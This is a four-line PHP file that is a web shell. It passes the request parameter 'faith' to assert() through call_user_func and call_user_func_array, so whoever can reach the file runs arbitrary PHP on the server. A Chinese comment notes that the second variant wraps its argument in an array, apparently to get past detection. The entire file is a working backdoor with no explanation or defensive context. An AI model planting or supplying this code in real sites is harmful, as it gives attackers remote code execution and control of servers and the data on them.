<?php 
call_user_func('assert', $_POST['faith']);
call_user_func_array('assert', array($_REQUEST['faith']));
#第二个函数的参数改为数组
?>